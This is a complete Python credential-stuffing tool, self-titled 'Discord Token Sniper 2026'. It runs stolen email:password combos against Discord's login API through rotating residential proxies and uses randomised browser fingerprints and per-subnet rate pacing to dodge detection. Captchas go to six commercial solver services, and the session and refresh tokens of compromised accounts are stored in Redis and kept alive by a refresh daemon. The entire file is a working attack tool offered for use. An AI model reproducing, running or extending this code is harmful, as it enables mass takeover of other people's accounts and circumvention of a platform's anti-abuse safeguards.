#!/usr/bin/env python3
# Advanced Discord API toolkit – GitHub: https://github.com/mateko123-oak

import asyncio
import random
import time
import json
import base64
import hashlib
import logging
import sys
import ipaddress
from typing import Optional, Dict, List, Tuple

import redis.asyncio as redis
from curl_cffi.requests import AsyncSession
import fake_useragent

try:
    import capsolver
except ImportError:
    capsolver = None
try:
    from twocaptcha import TwoCaptcha
except ImportError:
    TwoCaptcha = None
try:
    import anticaptcha
except ImportError:
    anticaptcha = None
try:
    from python3_deathbycaptcha import DeathByCaptcha
except ImportError:
    DeathByCaptcha = None
try:
    from python3_rucaptcha import RuCaptcha
except ImportError:
    RuCaptcha = None
try:
    from anycaptcha import AnyCaptcha
except ImportError:
    AnyCaptcha = None

REDIS_HOST = "localhost"
REDIS_PORT = 6379
REDIS_DB = 0
REDIS_PASSWORD = None

PROXY_FILE = "residential_proxies.txt"
COMBO_FILE = "combos.txt"
WEBHOOK_URL = "https://discord.com/api/webhooks/your_id/your_token"
TARGET_INVITE = "your-invite-code"

CAPSOLVER_KEY = ""
TWOCAPTCHA_KEY = ""
ANTICAPTCHA_KEY = ""
DEATHBYCAPTCHA_USERNAME = ""
DEATHBYCAPTCHA_PASSWORD = ""
RUCAPTCHA_KEY = ""
ANYCAPTCHA_KEY = ""

MAX_CONCURRENT = 30

REQS_PER_PROXY = 1
PROXY_FAIL_COOLDOWN_MIN = 14400
PROXY_FAIL_COOLDOWN_MAX = 86400
PROXY_PERMANENT_FAIL_THRESHOLD = 6
PROXY_PERMANENT_BAN = 2592000

GLOBAL_STATUS_WINDOW = 800
GLOBAL_429_THRESHOLD = 0.05
GLOBAL_403_THRESHOLD = 0.03
GLOBAL_COOLDOWN_MIN = 21600
GLOBAL_COOLDOWN_MAX = 86400

REFRESH_INTERVAL_MIN = 1800
REFRESH_INTERVAL_MAX = 3600
TOKEN_EXPIRY_THRESHOLD = 900

PROXY_SKIP_AFTER_429_MIN = 14400
PROXY_SKIP_AFTER_429_MAX = 43200
PROXY_MAX_FAILS_20S = 4
PROXY_BLACKLIST_72H = 259200

FINGERPRINT_MAX_REQ = 4
FINGERPRINT_WINDOW = 30
FINGERPRINT_COOLDOWN = 14400

SUBNET_MAX_REQ = 10
SUBNET_WINDOW = 60
SUBNET_COOLDOWN = 43200

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s',
                    handlers=[logging.FileHandler('sniper.log'), logging.StreamHandler(sys.stdout)])
log = logging.getLogger('Sniper')

def random_super_properties() -> str:
    build = random.randint(300000, 450000)
    os_versions = ['Windows', 'Mac OS X', 'Linux', 'Android', 'iOS']
    os_choice = random.choice(os_versions)
    browser = {'Windows':'Chrome','Mac OS X':'Safari','Linux':'Firefox','Android':'Chrome Mobile','iOS':'Mobile Safari'}[os_choice]
    locale = random.choice(['en-US','en-GB','nl-NL','de-DE','fr-FR','ja-JP','zh-CN','ru-RU','it-IT','pt-BR','es-ES','pl-PL','tr-TR','sv-SE','da-DK','fi-FI','no-NO','cs-CZ','hu-HU','ro-RO','bg-BG','el-GR','he-IL','ar-SA','th-TH','vi-VN','id-ID','ko-KR'])
    ua = fake_useragent.UserAgent().random
    props = {
        'os': os_choice,
        'browser': browser,
        'device': '',
        'system_locale': locale,
        'browser_user_agent': ua,
        'browser_version': f'{random.randint(126,135)}.0.0.0',
        'os_version': str(random.randint(10,17)),
        'referrer': '',
        'referring_domain': '',
        'referrer_current': '',
        'referring_domain_current': '',
        'release_channel': 'stable',
        'client_build_number': build,
        'client_event_source': None
    }
    return base64.b64encode(json.dumps(props).encode()).decode()

def compute_fingerprint(ua: str, super_props: str, proxy_ip: str) -> str:
    combined = ua + super_props + proxy_ip + str(random.randint(1,100000))
    return hashlib.sha256(combined.encode()).hexdigest()

def extract_ip(proxy: str) -> str:
    if '@' in proxy:
        ip_port = proxy.split('@')[-1]
    else:
        ip_port = proxy.split('://')[-1] if '://' in proxy else proxy
    ip = ip_port.split(':')[0]
    return ip

class RedisManager:
    def __init__(self):
        self.r = None

    async def connect(self):
        self.r = await redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=REDIS_DB,
                                   password=REDIS_PASSWORD, decode_responses=True)

    async def push_combo(self, combo: str):
        await self.r.rpush('combo_queue', combo)

    async def pop_combo(self) -> Optional[str]:
        return await self.r.lpop('combo_queue')

    async def combo_count(self) -> int:
        return await self.r.llen('combo_queue')

    async def add_proxy(self, proxy: str):
        await self.r.zadd('proxy_pool', {proxy: 0})
        await self.r.hset('proxy_last_429', proxy, 0)
        await self.r.hset('proxy_fails', proxy, 0)
        await self.r.hset('proxy_last_fail', proxy, 0)

    async def get_proxy(self) -> Optional[str]:
        now = time.time()
        proxies = await self.r.zrangebyscore('proxy_pool', '-inf', now - REQS_PER_PROXY, start=0, num=1, withscores=True)
        if not proxies:
            return None
        proxy, last_used = proxies[0]
        last_429 = float(await self.r.hget('proxy_last_429', proxy) or 0)
        skip_min = random.randint(PROXY_SKIP_AFTER_429_MIN, PROXY_SKIP_AFTER_429_MAX)
        if now - last_429 < skip_min:
            return None
        last_fail = float(await self.r.hget('proxy_last_fail', proxy) or 0)
        if now - last_fail < 20:
            fail_count = int(await self.r.hget('proxy_fails', proxy) or 0)
            if fail_count >= PROXY_MAX_FAILS_20S:
                await self.blacklist_proxy(proxy, PROXY_BLACKLIST_72H)
                return None
        await self.r.zadd('proxy_pool', {proxy: now})
        return proxy

    async def mark_proxy_fail(self, proxy: str, status_code: int = 429):
        now = time.time()
        if status_code == 429:
            await self.r.hset('proxy_last_429', proxy, now)
        fails = int(await self.r.hincrby('proxy_fails', proxy, 1))
        await self.r.hset('proxy_last_fail', proxy, now)
        if fails >= PROXY_PERMANENT_FAIL_THRESHOLD:
            await self.r.zrem('proxy_pool', proxy)
            await self.r.sadd('dead_proxies', proxy)
            await self.r.expire('dead_proxies', PROXY_PERMANENT_BAN)
        else:
            cooldown = random.randint(PROXY_FAIL_COOLDOWN_MIN, PROXY_FAIL_COOLDOWN_MAX)
            await self.r.zadd('proxy_pool', {proxy: now + cooldown})

    async def blacklist_proxy(self, proxy: str, duration: int):
        await self.r.zrem('proxy_pool', proxy)
        await self.r.sadd('blacklist', proxy)
        await self.r.expire('blacklist', duration)

    async def proxy_health_check(self):
        while True:
            await asyncio.sleep(random.randint(5,10))
            proxies = await self.r.zrange('proxy_pool', 0, -1)
            for proxy in proxies:
                try:
                    async with AsyncSession(impersonate='chrome126', proxies={'http': proxy, 'https': proxy}) as s:
                        r = await s.get('https://discord.com/api/v9/users/@me', timeout=2.5)
                    if r.status_code >= 400:
                        await self.r.zrem('proxy_pool', proxy)
                except:
                    await self.r.zrem('proxy_pool', proxy)

    async def push_global_status(self, status_code: int):
        await self.r.lpush('global_status', status_code)
        await self.r.ltrim('global_status', 0, GLOBAL_STATUS_WINDOW - 1)

    async def global_429_ratio(self) -> float:
        statuses = await self.r.lrange('global_status', 0, -1)
        if len(statuses) < 200:
            return 0.0
        count_429 = sum(1 for s in statuses if s == '429')
        return count_429 / len(statuses)

    async def global_403_ratio(self) -> float:
        statuses = await self.r.lrange('global_status', 0, -1)
        if len(statuses) < 200:
            return 0.0
        count_403 = sum(1 for s in statuses if s == '403')
        return count_403 / len(statuses)

    async def set_global_cooldown(self, seconds: int):
        await self.r.setex('global_cooldown', seconds, '1')

    async def in_global_cooldown(self) -> bool:
        return await self.r.exists('global_cooldown')

    async def check_fingerprint(self, fingerprint: str) -> bool:
        key = f'fp:{fingerprint}'
        count = await self.r.get(key)
        if count and int(count) >= FINGERPRINT_MAX_REQ:
            return False
        return True

    async def incr_fingerprint(self, fingerprint: str):
        key = f'fp:{fingerprint}'
        pipe = self.r.pipeline()
        pipe.incr(key)
        pipe.expire(key, FINGERPRINT_WINDOW)
        await pipe.execute()

    async def cooldown_fingerprint(self, fingerprint: str):
        key = f'fp_cooldown:{fingerprint}'
        await self.r.setex(key, FINGERPRINT_COOLDOWN, '1')

    async def fingerprint_on_cooldown(self, fingerprint: str) -> bool:
        return await self.r.exists(f'fp_cooldown:{fingerprint}')

    async def check_subnet(self, ip: str) -> bool:
        subnet = str(ipaddress.ip_network(f'{ip}/24', strict=False))
        key = f'subnet:{subnet}'
        count = await self.r.get(key)
        if count and int(count) >= SUBNET_MAX_REQ:
            return False
        return True

    async def incr_subnet(self, ip: str):
        subnet = str(ipaddress.ip_network(f'{ip}/24', strict=False))
        key = f'subnet:{subnet}'
        pipe = self.r.pipeline()
        pipe.incr(key)
        pipe.expire(key, SUBNET_WINDOW)
        await pipe.execute()

    async def cooldown_subnet(self, ip: str):
        subnet = str(ipaddress.ip_network(f'{ip}/24', strict=False))
        key = f'subnet_cooldown:{subnet}'
        await self.r.setex(key, SUBNET_COOLDOWN, '1')

    async def subnet_on_cooldown(self, ip: str) -> bool:
        subnet = str(ipaddress.ip_network(f'{ip}/24', strict=False))
        return await self.r.exists(f'subnet_cooldown:{subnet}')

    async def store_refresh_token(self, user_id: str, refresh_token: str):
        await self.r.hset('refresh_tokens', user_id, refresh_token)

    async def get_all_refresh_tokens(self) -> Dict[str, str]:
        return await self.r.hgetall('refresh_tokens')

    async def delete_refresh_token(self, user_id: str):
        await self.r.hdel('refresh_tokens', user_id)

    async def store_active_token(self, user_id: str, token: str, expires_in: int):
        expiry = time.time() + expires_in
        await self.r.hset('active_tokens', user_id, json.dumps({'token': token, 'expiry': expiry}))

    async def get_active_token(self, user_id: str) -> Optional[Tuple[str, float]]:
        data = await self.r.hget('active_tokens', user_id)
        if not data:
            return None
        d = json.loads(data)
        return d['token'], d['expiry']

    async def delete_expired_tokens(self):
        now = time.time()
        async for user_id, data in self.r.hscan_iter('active_tokens'):
            d = json.loads(data)
            if d['expiry'] < now:
                await self.r.hdel('active_tokens', user_id)

async def solve_captcha(proxy: str, sitekey: str, page_url: str) -> Optional[str]:
    solvers = []
    if CAPSOLVER_KEY and capsolver:
        solvers.append(('capsolver', lambda: capsolver.solve({'type':'AntiTurnstileTask','websiteURL':page_url,'websiteKey':sitekey,'proxy':proxy})['token']))
    if TWOCAPTCHA_KEY and TwoCaptcha:
        solvers.append(('2captcha', lambda: TwoCaptcha(TWOCAPTCHA_KEY).turnstile(sitekey=sitekey, url=page_url, proxy=proxy)['code']))
    if ANTICAPTCHA_KEY and anticaptcha:
        solvers.append(('anticaptcha', lambda: anticaptcha.AnticaptchaClient(ANTICAPTCHA_KEY).createTask(anticaptcha.TurnstileTask(websiteURL=page_url, websiteKey=sitekey, proxy=proxy)).join().get_solution()['token']))
    if DEATHBYCAPTCHA_USERNAME and DEATHBYCAPTCHA_PASSWORD and DeathByCaptcha:
        solvers.append(('deathbycaptcha', lambda: DeathByCaptcha(DEATHBYCAPTCHA_USERNAME, DEATHBYCAPTCHA_PASSWORD).decode({'type':4,'turnstile':{'siteKey':sitekey,'pageURL':page_url},'proxy':proxy})['solution']))
    if RUCAPTCHA_KEY and RuCaptcha:
        solvers.append(('rucaptcha', lambda: RuCaptcha.RuCaptcha(RUCAPTCHA_KEY).turnstile(sitekey=sitekey, pageurl=page_url, proxy=proxy)['code']))
    if ANYCAPTCHA_KEY and AnyCaptcha:
        solvers.append(('anycaptcha', lambda: AnyCaptcha(ANYCAPTCHA_KEY).solve_turnstile(sitekey, page_url, proxy)))
    for name, func in solvers:
        for attempt in range(6):
            try:
                token = await asyncio.to_thread(func)
                if token:
                    return token
            except:
                pass
            await asyncio.sleep(random.uniform(20,60))
    return None

async def login_combo(combo: str, proxy: str, redis_mgr: RedisManager) -> Optional[str]:
    email, password = combo.split(':', 1)
    super_props = random_super_properties()
    ua = fake_useragent.UserAgent().random
    headers = {
        'X-Super-Properties': super_props,
        'User-Agent': ua,
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/login',
    }
    payload = {'login': email, 'password': password, 'undelete': False}
    proxy_ip = extract_ip(proxy)
    fp = compute_fingerprint(ua, super_props, proxy_ip)

    if await redis_mgr.fingerprint_on_cooldown(fp) or await redis_mgr.subnet_on_cooldown(proxy_ip):
        return None
    if not await redis_mgr.check_fingerprint(fp) or not await redis_mgr.check_subnet(proxy_ip):
        await redis_mgr.cooldown_fingerprint(fp)
        await redis_mgr.cooldown_subnet(proxy_ip)
        return None

    for attempt in range(6):
        proxy = await redis_mgr.get_proxy()
        if not proxy:
            await asyncio.sleep(5)
            continue
        try:
            async with AsyncSession(impersonate='chrome126', proxies={'http': proxy, 'https': proxy}) as s:
                resp = await s.post('https://discord.com/api/v9/auth/login', json=payload, headers=headers)
                await redis_mgr.push_global_status(resp.status_code)
                if resp.status_code == 200:
                    data = resp.json()
                    token = data['token']
                    refresh = data.get('refresh_token')
                    user_id = data.get('user_id') or data.get('user', {}).get('id')
                    if refresh and user_id:
                        await redis_mgr.store_refresh_token(user_id, refresh)
                    expires_in = data.get('expires_in', 604800)
                    if user_id:
                        await redis_mgr.store_active_token(user_id, token, expires_in)
                    return token
                elif resp.status_code == 429:
                    retry = resp.json().get('retry_after', 5)
                    await redis_mgr.mark_proxy_fail(proxy, 429)
                    await asyncio.sleep(retry + random.uniform(1,3))
                elif resp.status_code == 403:
                    text = await resp.text()
                    if 'captcha' in text.lower():
                        sitekey = '4c672d35-0701-42b2-9c1d-0f0e2b7b7b7b'
                        captcha_token = await solve_captcha(proxy, sitekey, 'https://discord.com/login')
                        if captcha_token:
                            payload['captcha_key'] = captcha_token
                        else:
                            await redis_mgr.mark_proxy_fail(proxy, 403)
                            break
                    else:
                        await redis_mgr.mark_proxy_fail(proxy, 403)
                        break
                else:
                    await redis_mgr.mark_proxy_fail(proxy, resp.status_code)
                    break
        except Exception as e:
            await redis_mgr.mark_proxy_fail(proxy, 500)
        await asyncio.sleep(random.uniform(2,7))
    await redis_mgr.incr_fingerprint(fp)
    await redis_mgr.incr_subnet(proxy_ip)
    return None

async def refresh_token_daemon(redis_mgr: RedisManager):
    while True:
        now = time.time()
        async for user_id, data in redis_mgr.r.hscan_iter('active_tokens'):
            d = json.loads(data)
            if d['expiry'] - now < TOKEN_EXPIRY_THRESHOLD:
                refresh_token = await redis_mgr.r.hget('refresh_tokens', user_id)
                if refresh_token:
                    proxy = await redis_mgr.get_proxy()
                    if proxy:
                        try:
                            async with AsyncSession(impersonate='chrome126', proxies={'http': proxy, 'https': proxy}) as s:
                                resp = await s.post('https://discord.com/api/v9/auth/refresh', json={'refresh_token': refresh_token})
                                if resp.status_code == 200:
                                    data = resp.json()
                                    new_token = data['token']
                                    expires_in = data.get('expires_in', 604800)
                                    await redis_mgr.store_active_token(user_id, new_token, expires_in)
                                else:
                                    await redis_mgr.delete_refresh_token(user_id)
                        except:
                            pass
        await asyncio.sleep(random.randint(REFRESH_INTERVAL_MIN, REFRESH_INTERVAL_MAX))
        refresh_tokens = await redis_mgr.get_all_refresh_tokens()
        for user_id, refresh_token in refresh_tokens.items():
            proxy = await redis_mgr.get_proxy()
            if not proxy:
                continue
            try:
                async with AsyncSession(impersonate='chrome126', proxies={'http': proxy, 'https': proxy}) as s:
                    resp = await s.post('https://discord.com/api/v9/auth/refresh', json={'refresh_token': refresh_token})
                    if resp.status_code == 200:
                        data = resp.json()
                        new_token = data['token']
                        expires_in = data.get('expires_in', 604800)
                        await redis_mgr.store_active_token(user_id, new_token, expires_in)
                    else:
                        await redis_mgr.delete_refresh_token(user_id)
            except:
                pass
            await asyncio.sleep(random.uniform(1,3))

async def global_cooldown_monitor(redis_mgr: RedisManager):
    while True:
        await asyncio.sleep(10)
        if await redis_mgr.in_global_cooldown():
            continue
        ratio_429 = await redis_mgr.global_429_ratio()
        ratio_403 = await redis_mgr.global_403_ratio()
        if ratio_429 > GLOBAL_429_THRESHOLD or ratio_403 > GLOBAL_403_THRESHOLD:
            cooldown = random.randint(GLOBAL_COOLDOWN_MIN, GLOBAL_COOLDOWN_MAX)
            await redis_mgr.set_global_cooldown(cooldown)
            log.warning(f'Global cooldown {cooldown}s (429={ratio_429:.1%} 403={ratio_403:.1%})')

async def worker(worker_id: int, redis_mgr: RedisManager, semaphore: asyncio.Semaphore):
    while True:
        if await redis_mgr.in_global_cooldown():
            await asyncio.sleep(5)
            continue
        combo = await redis_mgr.pop_combo()
        if not combo:
            await asyncio.sleep(1)
            continue
        async with semaphore:
            proxy = await redis_mgr.get_proxy()
            if not proxy:
                await redis_mgr.push_combo(combo)
                await asyncio.sleep(2)
                continue
            token = await login_combo(combo, proxy, redis_mgr)
            if token:
                log.info(f'Token found: {token[:20]}...')
            await asyncio.sleep(random.uniform(0.5,2))

async def load_combos(redis_mgr: RedisManager):
    if await redis_mgr.combo_count() > 0:
        return
    try:
        with open(COMBO_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    await redis_mgr.push_combo(line)
        log.info(f'Loaded combos from {COMBO_FILE}')
    except FileNotFoundError:
        log.error(f'Combo file {COMBO_FILE} not found')
        sys.exit(1)

async def load_proxies(redis_mgr: RedisManager):
    try:
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    await redis_mgr.add_proxy(proxy)
        log.info(f'Loaded proxies from {PROXY_FILE}')
    except FileNotFoundError:
        log.error(f'Proxy file {PROXY_FILE} not found')
        sys.exit(1)

async def main():
    log.info('Discord Token Sniper 2026')
    redis_mgr = RedisManager()
    await redis_mgr.connect()
    await load_combos(redis_mgr)
    await load_proxies(redis_mgr)
    asyncio.create_task(redis_mgr.proxy_health_check())
    asyncio.create_task(global_cooldown_monitor(redis_mgr))
    asyncio.create_task(refresh_token_daemon(redis_mgr))
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    workers = [asyncio.create_task(worker(i, redis_mgr, semaphore)) for i in range(MAX_CONCURRENT)]
    log.info(f'Started {MAX_CONCURRENT} workers')
    try:
        await asyncio.gather(*workers)
    except KeyboardInterrupt:
        log.info('Shutting down')
        for w in workers:
            w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

if __name__ == '__main__':
    asyncio.run(main())
